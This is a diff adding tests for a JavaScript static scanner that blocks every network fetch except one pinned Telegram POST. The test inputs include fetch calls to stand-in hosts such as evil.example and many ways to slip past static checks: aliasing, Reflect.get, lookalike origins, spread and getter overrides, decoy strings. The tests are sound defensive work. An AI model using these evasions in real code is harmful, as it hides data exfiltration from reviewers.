@@ -409,6 +409,150 @@ describe('ADR-0035 §4 guard — ADR-0040 notification dispatch (per-source nega
 });
 
 // ---------------------------------------------------------------------------
+// (c) Negative-conformance — ADR-0041 §2d global fetch egress (KEYSTONE gate)
+// ---------------------------------------------------------------------------
+
+describe('ADR-0041 §2d guard — global fetch egress (per-source negative conformance)', () => {
+  // The pinned E1 egress shape the `channel` slice will add to notify.mjs: a
+  // direct global fetch to the fixed Telegram host, POST, redirect:'error', a
+  // bounded AbortSignal timeout, URL a template whose STATIC prefix is the
+  // allowlisted origin (token interpolated only AFTER it).
+  const PINNED = "fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000), body: payload })";
+
+  it('the pinned Telegram POST in notify.mjs → NO finding', () => {
+    deepStrictEqual(scan('notify.mjs', `const token = 't'; const payload = 'x'; ${PINNED};`), []);
+  });
+
+  it('global fetch in a NON-registered runtime file → global-fetch-gate', () => {
+    ok(rules(scan('cutover-audit.mjs', `${PINNED};`)).includes('global-fetch-gate'));
+  });
+
+  it('globalThis.fetch in a capability-importer file (not fetch-registered) → global-fetch-gate', () => {
+    ok(rules(scan('doctor.mjs', `globalThis.fetch('https://api.telegram.org/x', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });`)).includes('global-fetch-gate'));
+  });
+
+  it('a non-POST method → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'GET', redirect: 'error', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
+  });
+
+  it('a non-allowlisted origin → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch('https://evil.example.com/send', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
+  });
+
+  it('a userinfo-trick lookalike origin (api.telegram.org@evil.com) → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org@evil.com/x', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) })")).includes('global-fetch-gate'));
+  });
+
+  it('a missing timeout → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', redirect: 'error' })")).includes('global-fetch-gate'));
+  });
+
+  it('redirect-following (no redirect:error) → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
+  });
+
+  it('a non-literal (variable) URL → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch(url, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
+  });
+
+  it('an aliased fetch in notify.mjs (defeats static validation) → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "const f = fetch; f(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
+  });
+
+  it('a destructured fetch from globalThis → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "const { fetch } = globalThis;")).includes('global-fetch-gate'));
+  });
+
+  // Codex-review CRITICAL bypasses — the fail-closed redesign must now catch
+  // every indirection form and every validation dodge.
+  it('optional-chaining call fetch?.() in a non-registered file → global-fetch-gate', () => {
+    ok(rules(scan('cutover-audit.mjs', "fetch?.('https://evil.example/x', opts);")).includes('global-fetch-gate'));
+  });
+  it("computed access globalThis['fetch']() → global-fetch-gate", () => {
+    ok(rules(scan('cutover-audit.mjs', "globalThis['fetch']('https://evil.example/x', opts);")).includes('global-fetch-gate'));
+  });
+  it("Reflect.get(globalThis,'fetch')() → global-fetch-gate", () => {
+    ok(rules(scan('cutover-audit.mjs', "Reflect.get(globalThis, 'fetch')('https://evil.example/x', opts);")).includes('global-fetch-gate'));
+  });
+  it('fetch.call/.apply → global-fetch-gate', () => {
+    ok(rules(scan('cutover-audit.mjs', "fetch.call(globalThis, 'https://evil.example/x', opts);")).includes('global-fetch-gate'));
+  });
+  it('a globalThis alias then member call (const g = globalThis; g.fetch()) → global-fetch-gate', () => {
+    ok(rules(scan('cutover-audit.mjs', "const g = globalThis; g.fetch('https://evil.example/x', opts);")).includes('global-fetch-gate'));
+  });
+  it('a tagged-template fetch`...` → global-fetch-gate', () => {
+    ok(rules(scan('cutover-audit.mjs', 'fetch`https://evil.example/x`;')).includes('global-fetch-gate'));
+  });
+  it('URL via && / concatenation defeating the pinned literal → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot' && 'https://evil.example/x', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
+  });
+  it('a real GET init hidden behind a decoy 3rd arg (fetch(url, undefined, {pinned})) → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, undefined, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
+  });
+  it('pinned tokens buried in a nested string, real init is GET/redirect-follow → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'GET', redirect: 'follow', note: \"method:'POST' redirect:'error' AbortSignal.timeout(\" });")).includes('global-fetch-gate'));
+  });
+  it('a local shadow wrapper that egresses elsewhere but looks pinned → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "const fetch = (u, o) => globalThis['fetch']('https://evil.example/x', o); fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
+  });
+  it('the origin-only-but-wrong-endpoint (/deleteWebhook) → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/deleteWebhook', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
+  });
+
+  // Codex re-review (round 2) — the fail-closed redesign's own new holes.
+  it('a pinned-shaped decoy fetch( in a string cannot cancel a real alias → global-fetch-gate', () => {
+    const src = "const f = fetch;\n"
+      + "const decoy = \"fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) })\";\n"
+      + "f('https://evil.example/x', { method: 'GET' });";
+    ok(rules(scan('notify.mjs', src)).includes('global-fetch-gate'));
+  });
+  it("Reflect['get'](globalThis,'fetch') → global-fetch-gate", () => {
+    ok(rules(scan('cutover-audit.mjs', "Reflect['get'](globalThis, 'fetch')('https://evil.example/x', {});")).includes('global-fetch-gate'));
+  });
+  it('Object.getOwnPropertyDescriptor(globalThis, "fetch").value → global-fetch-gate', () => {
+    ok(rules(scan('cutover-audit.mjs', "Object.getOwnPropertyDescriptor(globalThis, 'fetch').value('https://evil.example/x', {});")).includes('global-fetch-gate'));
+  });
+  it('a spread that overrides the pinned init → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5), ...evil });")).includes('global-fetch-gate'));
+  });
+  it('a duplicate later method key overriding the pinned one → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5), method: 'GET' });")).includes('global-fetch-gate'));
+  });
+  it('a bare timeout: option (Node fetch ignores it, no signal) → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', timeout: 5000 });")).includes('global-fetch-gate'));
+  });
+  it('an operator-guarded signal (never || AbortSignal.timeout) → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: never || AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
+  });
+  it('a second pinned-shape send (different token) → global-fetch-gate', () => {
+    const src = "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });\n"
+      + "fetch('https://api.telegram.org/bot9/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });";
+    ok(rules(scan('notify.mjs', src)).includes('global-fetch-gate'));
+  });
+
+  // Fail-CLOSED must not over-reject the legitimate forms.
+  it('a fetch-mentioning string in a non-registered file is NOT flagged (no over-reject)', () => {
+    deepStrictEqual(scan('cutover-audit.mjs', 'const help = "fetch(url, init)";'), []);
+  });
+  it("the channel's full pinned call (template URL + body + headers) in notify.mjs → NO finding", () => {
+    const src = "const token = 't'; const payload = {}; "
+      + "fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000), body: JSON.stringify(payload), headers: { 'Content-Type': 'application/json' } });";
+    deepStrictEqual(scan('notify.mjs', src), []);
+  });
+
+  // Codex round-3 — the round-2 fixes' own residual holes.
+  it('a fetch inside a template ${...} interpolation (executable code) → global-fetch-gate', () => {
+    ok(rules(scan('cutover-audit.mjs', "const leak = `${await fetch('https://evil.example/x', { method: 'GET' })}`;")).includes('global-fetch-gate'));
+  });
+  it('a padded Reflect.get(globalThis, <spaces> "fetch") → global-fetch-gate', () => {
+    ok(rules(scan('cutover-audit.mjs', "Reflect.get(globalThis,                              'fetch')('https://evil.example/x', {});")).includes('global-fetch-gate'));
+  });
+  it('a getter property overriding a pinned key at runtime → global-fetch-gate', () => {
+    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5), get redirect() { return 'follow'; } });")).includes('global-fetch-gate'));
+  });
+});
+
+// ---------------------------------------------------------------------------
 // (c) Registry drift — registry never looser than the code
 // ---------------------------------------------------------------------------
 
